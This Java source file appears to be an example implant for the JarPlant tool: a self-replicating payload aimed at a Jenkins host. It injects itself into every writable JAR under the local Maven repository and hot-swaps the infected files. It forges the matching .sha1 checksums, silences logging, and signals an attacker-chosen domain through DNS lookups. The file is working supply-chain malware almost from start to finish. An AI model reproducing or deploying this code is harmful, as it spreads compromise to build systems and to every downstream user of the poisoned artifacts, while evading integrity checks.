package org.example.implants;

import io.github.w1th4d.jarplant.*;

import java.io.IOException;
import java.net.InetAddress;
import java.net.UnknownHostException;
import java.nio.file.FileAlreadyExistsException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.StandardOpenOption;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.security.SecureRandom;
import java.text.DecimalFormat;
import java.time.Duration;
import java.util.*;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.jar.JarFile;
import java.util.logging.Handler;
import java.util.logging.Logger;

public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler {
    static volatile String CONF_JVM_MARKER_PROP = "java.class.init";
    static volatile boolean CONF_BLOCK_JVM_SHUTDOWN = true;
    static volatile int CONF_DELAY_MS = 0;

    /**
     * The root directory so search for JARs.
     * All JARs in this directory will be spiked.
     */
    static volatile String CONF_LIMIT_PATH = "~/.m2/repository";

    /**
     * Paths that should be left alone.
     * This is a huge string with full paths separated by ';'.
     * Example: "~/.m2/repository/org/apache/maven;~/.m2/repository/org/springframework/boot"
     */
    static volatile String CONF_IGNORED_PATHS;

    static volatile int CONF_THREADS = 16;

    /**
     * Domain to report home to.
     */
    static volatile String CONF_DOMAIN;

    /**
     * The expected hostname of the target.
     * It will not run if the hostname of the machine does not match this value.
     * It's a bit of a sanity check so you don't accidentally trigger this in the wrong environment.
     * Ask us how we know...
     */
    static volatile String CONF_TARGET_HOSTNAME = "jenkins";

    // This one is not so important. Only use it for temp files and such.
    private static final Random rng = new Random(System.currentTimeMillis());

    @SuppressWarnings("unused")
    public static void init() {
        if (System.getProperty(CONF_JVM_MARKER_PROP) == null) {
            if (System.setProperty(CONF_JVM_MARKER_PROP, "true") == null) {
                SelfRepImplant implant = new SelfRepImplant();
                Thread background = new Thread(implant);
                background.setDaemon(!CONF_BLOCK_JVM_SHUTDOWN);
                background.setUncaughtExceptionHandler(implant);
                background.start();
            }
        }
    }

    @Override
    public void run() {
        if (CONF_DELAY_MS > 0) {
            try {
                Thread.sleep(CONF_DELAY_MS);
            } catch (InterruptedException ignored) {
            }
        }

        payload();
    }

    @Override
    public void uncaughtException(Thread thread, Throwable throwable) {
        // Silently ignore (don't throw up error messages on stderr)
    }

    // Make it executable. This is just relevant for the initial detonation. It's not required for further spreading.
    public static void main(String[] args) {
        init();
    }

    public static void payload() {
        Optional<String> hostname = getHostname();
        if (hostname.isEmpty() || !hostname.get().equals(CONF_TARGET_HOSTNAME)) {
            // Don't accidentally explode somewhere other than the test server
            System.out.println("Not inside Jenkins? Aborting.");
            return;
        }

        /*
         * Crudely prevent JarPlant from flooding the log/stdout.
         * If it's eerily quiet in the Jenkins output, try removing this line.
         */
        disableAllLogging();

        // Used for out-of-bounds exfil. We don't need many threads for this one.
        ExecutorService dnsThreads = Executors.newFixedThreadPool(1);

        String id = generateRandomId();
        if (CONF_DOMAIN != null) {
            dnsThreads.submit(() -> {
                callHome(CONF_DOMAIN, "hello", id);
            });
        }

        Set<Path> jarsToImplant;
        try {
            jarsToImplant = findAllJars(CONF_LIMIT_PATH, CONF_IGNORED_PATHS);
        } catch (Exception e) {
            System.out.println("[!] Failed to find JARs.");
            e.printStackTrace();
            return;
        }

        ImplantHandler implantHandler;
        try {
            implantHandler = ImplantHandlerImpl.findAndCreateFor(SelfRepImplant.class);
        } catch (ClassNotFoundException | ImplantException | IOException e) {
            System.out.println("[!] Cannot load oneself. Aborting.");
            System.exit(1);
            throw new RuntimeException("Unreachable");
        }

        System.out.println("[*] Implant: " + implantHandler.getImplantClassName());

        long plantTick = System.nanoTime();

        ExecutorService plantingThreads = Executors.newFixedThreadPool(CONF_THREADS);
        AtomicInteger numInfected = new AtomicInteger(0);
        for (Path jarToImplant : jarsToImplant) {
            plantingThreads.submit(() -> {
                ClassInjector injector;
                try {
                    injector = ClassInjector.createLoadedWith(implantHandler);
                } catch (ImplantException e) {
                    // Future optimization: Have the ImplantHandler check whatever throws this exception.
                    throw new RuntimeException(e);
                }

                JarFiddler jar;
                try {
                    jar = JarFiddler.buffer(jarToImplant);
                } catch (IOException e) {
                    System.out.println("[-] Failed to read JAR '" + jarToImplant + "'. Skipping.");
                    return;
                }

                Path outputTempFile;
                try {
                    outputTempFile = createTempFileFor(jarToImplant);
                } catch (IOException e) {
                    System.out.println("[-] Failed to get a temp file for '" + jarToImplant + "'. Skipping.");
                    return;
                }

                try {
                    boolean didInfect = injector.injectInto(jar);
                    if (didInfect) {
                        jar.write(outputTempFile, StandardOpenOption.CREATE_NEW);   // Atomic operation, failing on collision
                        System.out.println("[+] JarPlant '" + jarToImplant.getFileName() + "' -> '" + outputTempFile.getFileName() + "'.");
                        doTheSwitcharoo(jarToImplant, outputTempFile);
                        numInfected.incrementAndGet();
                        System.out.println("[+] Spiked JAR '" + jarToImplant + "'.");

                        recalculateMavenChecksumFile(jarToImplant);
                    } else {
                        System.out.println("[!] JarPlant chose to _not_ infect '" + jarToImplant + "'.");
                    }
                } catch (FileAlreadyExistsException e) {
                    System.out.println("[-] File '" + outputTempFile + "' already exist. Skipping to avoid problems.");
                } catch (IOException e) {
                    System.out.println("[-] Failed to spike JAR '" + jarToImplant + "' (" + e.getMessage() + ")");
                    cleanUpTempFile(outputTempFile);
                }
            });
        }

        // Wait for all threads to complete.
        shutdownAndWaitForThreads(plantingThreads);

        long plantTock = System.nanoTime();
        System.out.println("[#] JarPlanting took " + Duration.ofNanos(plantTock - plantTick));

        String successRatePercentage = getSuccessRatePercentage(numInfected.get(), jarsToImplant.size());
        System.out.println("[*] Spiked " + numInfected + " out of " + jarsToImplant.size() + " (" + successRatePercentage + ") JARs.");

        if (CONF_DOMAIN != null) {
            dnsThreads.submit(() -> {
                callHome(CONF_DOMAIN, "did-" + numInfected, id);
            });
        }

        // Wait for the DNS requests to finnish.
        shutdownAndWaitForThreads(dnsThreads);
    }

    private static void shutdownAndWaitForThreads(ExecutorService threads) {
        threads.shutdown();
        try {
            if (!threads.awaitTermination((long) CONF_THREADS * 10, TimeUnit.SECONDS)) {
                System.out.println("[!] Some concurrent task(s) did not finnish!");

                // Something is taking too long. Shutdown hard by interrupting all threads.
                threads.shutdownNow();
                if (!threads.awaitTermination(10, TimeUnit.SECONDS)) {
                    System.out.println("[!] Some concurrent task(s) had to be shut down hard!");
                    threads.shutdownNow();
                    if (!threads.awaitTermination(10, TimeUnit.SECONDS)) {
                        // Blood will be spilled.
                    }
                }
            }
        } catch (InterruptedException ignored) {
            // Someone wants us terminated. Gracefully GTFO.
            threads.shutdownNow();
            Thread.currentThread().interrupt();
        }
    }

    private static void cleanUpTempFile(Path outputTempFile) {
        if (Files.exists(outputTempFile)) {
            try {
                Files.delete(outputTempFile);
                System.out.println("[#] Removed temp file '" + outputTempFile + "'.");
            } catch (IOException ex) {
                System.out.println("[!] Failed to clean up temp file '" + outputTempFile + "'. Sorry for littering!");
            }
        }
    }

    // Why is this so complicated? Had ChatGPT generate this...
    private static String getSuccessRatePercentage(int success, int total) {
        if (total <= 0) {
            return "0%";
        }

        double successRate = (double) success / total;
        double successRatePercentage = Math.min(100.0, Math.max(0.0, successRate * 100));

        DecimalFormat percentage = new DecimalFormat("0");
        return percentage.format(successRatePercentage) + "%";
    }

    /**
     * Update the SHA1 checksum file for a JAR.
     * Maven has these checksum files alongside JAR files in the repository.
     * This method updates the .sha1 file for a given .jar file on disk.
     *
     * @param jarToImplant Existing JAR file
     */
    private static void recalculateMavenChecksumFile(Path jarToImplant) {
        Path sha1File = jarToImplant.resolveSibling(jarToImplant.getFileName() + ".sha1");
        if (Files.exists(sha1File)) {
            try {
                // Potential optimization: Don't re-read the file (use buffer from somewhere inside injector)
                String humanReadableHashValue = calcSha1Digest(Files.readAllBytes(jarToImplant));
                Files.writeString(sha1File, humanReadableHashValue, StandardOpenOption.TRUNCATE_EXISTING);
                System.out.println("[+] Modified SHA1 file '" + sha1File + "'.");
            } catch (IOException e) {
                System.out.println("[!] Failed to modify SHA1 file '" + sha1File + "' (" + e.getMessage() + ").");
            }
        }
    }

    public static Set<Path> findAllJars(String root) {
        return findAllJars(root, null);
    }

    public static Set<Path> findAllJars(String root, String ignoreSpec) throws IllegalArgumentException {
        root = expandPath(root);

        Path dir = Path.of(root);
        if (!Files.isDirectory(dir)) {
            throw new IllegalArgumentException("Not a directory");
        }

        Set<Path> ignorePaths;
        if (ignoreSpec == null) {
            ignorePaths = Collections.emptySet();
        } else {
            ignorePaths = new HashSet<>();

            // Convert provided Strings to actual Path objects
            String[] ignoreSpecSplit = ignoreSpec.split(";");
            for (String pathSpec : ignoreSpecSplit) {
                pathSpec = expandPath(pathSpec);
                Path actualPath = Path.of(pathSpec);
                ignorePaths.add(actualPath);
            }
        }

        // Recurse through the file structure
        Set<Path> validJarFiles = new HashSet<>();
        findAllJars(dir, validJarFiles, Collections.unmodifiableSet(ignorePaths));

        return validJarFiles;
    }

    // Java does not natively support the ~ shorthand path. Expand it manually.
    private static String expandPath(String pathSpec) {
        if (pathSpec.contains("~")) {
            String home = System.getProperty("user.home");
            if (home == null) {
                throw new IllegalArgumentException("Cannot find home directory.");
            }

            pathSpec = pathSpec.replace("~", home);
        }
        return pathSpec;
    }

    // Recursive function
    private static void findAllJars(Path dir, Set<Path> accumulator, Set<Path> ignoredPaths) {
        if (ignoredPaths.contains(dir)) {
            return;
        }

        List<Path> subPaths;
        try {
            subPaths = Files.list(dir).toList();
        } catch (IOException ignored) {
            return;
        }

        List<Path> subDirs = new LinkedList<>();
        for (Path subPath : subPaths) {
            if (Files.isDirectory(subPath)) {
                subDirs.add(subPath);
                continue;
            }

            if (!Files.isRegularFile(subPath)) {
                continue;
            }
            if (!Files.isWritable(subPath)) {
                continue;
            }
            if (!subPath.toString().endsWith(".jar")) {
                continue;
            }
            if (!isJar(subPath)) {
                continue;
            }

            accumulator.add(subPath);
        }

        for (Path subDir : subDirs) {
            findAllJars(subDir, accumulator, ignoredPaths);
        }
    }

    private static boolean isJar(Path suspectedJarFile) {
        try (JarFile jarFile = new JarFile(suspectedJarFile.toFile())) {
            return jarFile.getManifest() != null;
        } catch (IOException e) {
            return false;
        }
    }

    /**
     * Get a temporary sibling file for a given existing file.
     * This will specifically not create the file yet, only assure it does not exist as of right now.
     * Beware of TOCTOU bugs.
     * In other words: There are no guarantees that the file will not be crated by something else between the time
     * of this method returns and when the file is to be actually created.
     *
     * @param baseFile filename to base the temporary file name on
     * @return a path to a temp file that is not yet created
     * @throws IOException if anything went wrong
     */
    private static Path createTempFileFor(Path baseFile) throws IOException {
        String targetFilename = baseFile.getFileName().toString();

        Path tempFilePath;
        int triesLeft = 10;
        do {
            int random = Math.abs(rng.nextInt());
            String newFileName = "." + targetFilename + "." + random + ".tmp";
            tempFilePath = baseFile.resolveSibling(newFileName);

            triesLeft--;
            if (triesLeft <= 0) {
                // What are the odds?
                throw new IOException("We're all out of luck on generating a temp file.");
            }
        } while (Files.exists(tempFilePath));  // It's very unlikely, but keep generating random names...

        if (!Files.isWritable(tempFilePath.getParent())) {
            System.out.println("[-] Path '" + tempFilePath.getParent() + "' is not writable! Aborting.");
            throw new IOException("Not writable: " + tempFilePath);
        }

        return tempFilePath;
    }

    /**
     * Replace a JAR file without ruining any JVM that already has the JAR open.
     * <p>The JVM indexes all classes that it has on it's classpath but actually reads and loads it lazily.
     * When the JVM opens a JAR file on the classpath, it only reads the index of files and some metadata about it.
     * It's first when/if the class is needed that it actually reads the class from the JAR file.
     * If a class inside a JAR file is modified between the indexing and the loading, then there will be a checksum
     * mismatch of what was indexed and what's read.
     * This is a tricky situation to circumvent.</p>
     * <p>This method (together with {@link #createTempFileFor(Path)}) constitutes a trick to circumvent this.
     * It does so by moving the JAR to a new filename. In POSIX (like Linux) systems, the file handle will still be
     * open and valid even as the underlying file is moved.
     * A modified version of the JAR can then be put into place of the original.
     * Any JVM process that has already loaded the JAR will still be able to read (unmodified) classes from it
     * because it keeps the same file handle open, while any newly spawned JVM processes will catch the modified JAR
     * fresh from disk.</p>
     * <p>Caution: The moved file will remain on disk and may need to be removed manually.
     * If the file already exist, then this method will fail. It will always remove the replacement file.</p>
     * <p>This will not work on Windows systems.</p>
     * <p>It's yet unclear if this will work over NFS shares or even Docker volumes.</p>
     *
     * @param original    JAR to replace
     * @param replacement replacement JAR
     * @throws IOException if anything went wrong
     */
    private static void doTheSwitcharoo(Path original, Path replacement) throws IOException {
        if (!Files.exists(replacement)) {
            throw new IllegalArgumentException("File '" + replacement + "' does not exist.");
        }

        // First move the original JAR (that may be in use at the moment)
        Path moved = original.resolveSibling("." + original.getFileName().getFileName() + ".cache");
        try {
            Files.move(original, moved);
            System.out.println("[+] Moved '" + original.getFileName() + "' -> '" + moved.getFileName() + "'.");
        } catch (FileAlreadyExistsException e) {
            /*
             * A tempting alternative would be to always create these '.cache' files with a random file name suffix.
             * This will litter the directory and eventually fill up the disk, which is worse.
             * The problem is that there's no _reliable_ way of cleaning up these files when it's unknown if they're
             * in use or not, so they'll be around forever. One way could be to move them into /tmp and hope for
             * the best. Another way is to use a shutdown hook to delete the file, but that will not work if there's
             * another JVM process using the file.
             * Just back off.
             */
            cleanUpTempFile(replacement);
            throw e;
        } catch (IOException e) {
            // Clean up and back off
            cleanUpTempFile(replacement);
            throw e;
        }

        // Then replace the target with the temporary (spiked) JAR
        try {
            Files.move(replacement, original);
            System.out.println("[+] Moved '" + replacement.getFileName() + "' -> '" + original.getFileName() + "'.");
        } catch (IOException e) {
            // Do not leave the repo in a bad state!
            // Try to undo the whole switch
            Files.move(moved, original);    // If this fails, then there's no hope left
        }
    }

    private static Optional<String> getHostname() {
        try {
            return Optional.of(InetAddress.getLocalHost().getHostName());
        } catch (UnknownHostException ignored) {
            return Optional.empty();
        }
    }

    private static String generateRandomId() {
        // Potential optimization: Only init this once
        Random rng = new SecureRandom();
        return "" + rng.nextInt(0, Integer.MAX_VALUE);
    }

    @SuppressWarnings("all")
    private static void callHome(String domain, String... fields) {
        StringBuilder fqdn = new StringBuilder();
        for (String field : fields) {
            fqdn.append(field).append(".");
        }
        fqdn.append(domain);

        try {
            System.out.println("[$] Resolving '" + fqdn.toString() + "'.");
            InetAddress.getByName(fqdn.toString());
        } catch (UnknownHostException ignored) {
        }
    }

    private static String calcSha1Digest(byte[] input) {
        // Potential optimization: Init this once and just reset() it in between uses
        MessageDigest hasher;
        try {
            hasher = MessageDigest.getInstance("SHA1");
        } catch (NoSuchAlgorithmException e) {
            throw new RuntimeException("The JVM should have SHA1. This is weird.", e);
        }

        return hex(hasher.digest(input));
    }

    private static String hex(byte[] input) {
        StringBuilder hexString = new StringBuilder();
        for (byte b : input) {
            String hex = Integer.toHexString(0xFF & b);
            if (hex.length() == 1) {
                hexString.append('0');
            }
            hexString.append(hex);
        }

        return hexString.toString();
    }

    private static void disableAllLogging() {
        Logger rootLogger = Logger.getLogger("");
        for (Handler handler : rootLogger.getHandlers()) {
            rootLogger.removeHandler(handler);
        }
    }
}
